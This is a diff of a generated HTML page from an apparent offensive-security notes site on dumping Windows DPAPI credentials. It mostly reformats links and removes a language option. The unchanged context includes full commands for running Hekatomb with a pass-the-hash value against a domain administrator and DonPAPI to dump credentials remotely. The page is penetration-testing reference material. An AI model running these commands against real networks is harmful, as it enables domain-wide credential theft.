@@ -16,7 +16,7 @@
 <link rel="icon" href="/favicon.png" type="image/x-icon">
 <link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
   <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.c3b45b6301b51f548f0398109b6e109d45abf1314e421f8ba62cf6f72646f958.js" integrity="sha256-w7RbYwG1H1SPA5gQm24QnUWr8TFOQh&#43;Lpiz29yZG&#43;Vg=" crossorigin="anonymous"></script>
+  <script defer src="/en.search.min.4e979c41ea1da3eadea6cff7d8575b0664a8627f9c4b12e833490d3df55a9f7b.js" integrity="sha256-TpecQeodo&#43;reps/32FdbBmSoYn&#43;cSxLoM0kNPfVan3s=" crossorigin="anonymous"></script>
 
   <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
 
@@ -81,10 +81,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-  
-    
-  
-
 
 
 <ul class="book-languages">
@@ -98,12 +94,6 @@ https://github.com/alex-shpak/hugo-book
     </label>
 
     <ul>
-      
-      <li>
-        <a href="https://www.grayhatfreelancing.com/ru/">
-          Ukrainian
-        </a>
-      </li>
       
     </ul>
   </li>
@@ -1446,17 +1436,12 @@ https://github.com/alex-shpak/hugo-book
   <a class="anchor" href="#summary">#</a>
 </h2>
 <ul>
-<li>
-  <a href="/#data-protection-api">Data Protection API</a>
+<li><a href="#data-protection-api">Data Protection API</a>
 <ul>
-<li>
-  <a href="/#list-credential-files">List Credential Files</a></li>
-<li>
-  <a href="/#mimikatz&#43;&#43;&#43;credential-manager--dpapi">Mimikatz - Credential Manager &amp; DPAPI</a></li>
-<li>
-  <a href="/#hekatomb&#43;&#43;&#43;steal-all-credentials-on-domain">Hekatomb - Steal all credentials on domain</a></li>
-<li>
-  <a href="/#donpapi&#43;&#43;&#43;dumping-dpapi-credz-remotely">DonPAPI - Dumping DPAPI credz remotely</a></li>
+<li><a href="#list-credential-files">List Credential Files</a></li>
+<li><a href="#mimikatz&#43;&#43;&#43;credential-manager--dpapi">Mimikatz - Credential Manager &amp; DPAPI</a></li>
+<li><a href="#hekatomb&#43;&#43;&#43;steal-all-credentials-on-domain">Hekatomb - Steal all credentials on domain</a></li>
+<li><a href="#donpapi&#43;&#43;&#43;dumping-dpapi-credz-remotely">DonPAPI - Dumping DPAPI credz remotely</a></li>
 </ul>
 </li>
 </ul>
@@ -1506,20 +1491,17 @@ stations in the domain.</p>
   <a class="anchor" href="#hekatomb---steal-all-credentials-on-domain">#</a>
 </h3>
 <blockquote>
-<p>
-  <a href="https://github.com/Processus-Thief/HEKATOMB">Processus-Thief/Hekatomb</a> is a python script that connects to LDAP directory to retrieve all computers and users informations. Then it will download all DPAPI blob of all users from all computers. Finally, it will extract domain controller private key through RPC uses it to decrypt all credentials.</p>
+<p><a href="https://github.com/Processus-Thief/HEKATOMB">Processus-Thief/Hekatomb</a> is a python script that connects to LDAP directory to retrieve all computers and users informations. Then it will download all DPAPI blob of all users from all computers. Finally, it will extract domain controller private key through RPC uses it to decrypt all credentials.</p>
 </blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pip3 install hekatomb
 </span></span><span style="display:flex;"><span>hekatomb <span style="color:#f92672">-</span>hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN<span style="color:#f92672">.</span>local<span style="color:#f92672">/</span>administrator<span style="color:#f92672">@</span><span style="color:#ae81ff">10.0.0.1</span> <span style="color:#f92672">-</span>debug <span style="color:#f92672">-</span>dnstcp
-</span></span></code></pre></div><p>
-  <img src="https://github.com/Processus-Thief/HEKATOMB/raw/main/.assets/github1.png" alt="Data in memory" /></p>
+</span></span></code></pre></div><p><img src="https://github.com/Processus-Thief/HEKATOMB/raw/main/.assets/github1.png" alt="Data in memory" /></p>
 <h3 id="donpapi---dumping-dpapi-credz-remotely">
   DonPAPI - Dumping DPAPI credz remotely
   <a class="anchor" href="#donpapi---dumping-dpapi-credz-remotely">#</a>
 </h3>
 <ul>
-<li>
-  <a href="https://github.com/login-securite/DonPAPI">login-securite/DonPAPI</a></li>
+<li><a href="https://github.com/login-securite/DonPAPI">login-securite/DonPAPI</a></li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>DonPAPI.py domain/user<span style="color:#960050;background-color:#1e0010">:</span>passw0rd@target
 </span></span><span style="display:flex;"><span>DonPAPI.py --hashes &lt;LM&gt;<span style="color:#960050;background-color:#1e0010">:</span>&lt;NT&gt; domain/user@target
@@ -1532,10 +1514,8 @@ stations in the domain.</p>
   <a class="anchor" href="#references">#</a>
 </h2>
 <ul>
-<li>
-  <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords">DPAPI - Extracting Passwords - HackTricks</a></li>
-<li>
-  <a href="https://www.login-securite.com/2022/03/04/don-papi-ou-lart-daller-plus-loin-que-le-avec-dpapi/">DON PAPI, OU L’ART D’ALLER PLUS LOIN QUE LE DOMAIN ADMIN - LoginSecurité - CORTO GUEGUEN - 4 MARS 2022</a></li>
+<li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords">DPAPI - Extracting Passwords - HackTricks</a></li>
+<li><a href="https://www.login-securite.com/2022/03/04/don-papi-ou-lart-daller-plus-loin-que-le-avec-dpapi/">DON PAPI, OU L’ART D’ALLER PLUS LOIN QUE LE DOMAIN ADMIN - LoginSecurité - CORTO GUEGUEN - 4 MARS 2022</a></li>
 </ul>
 </article>
  
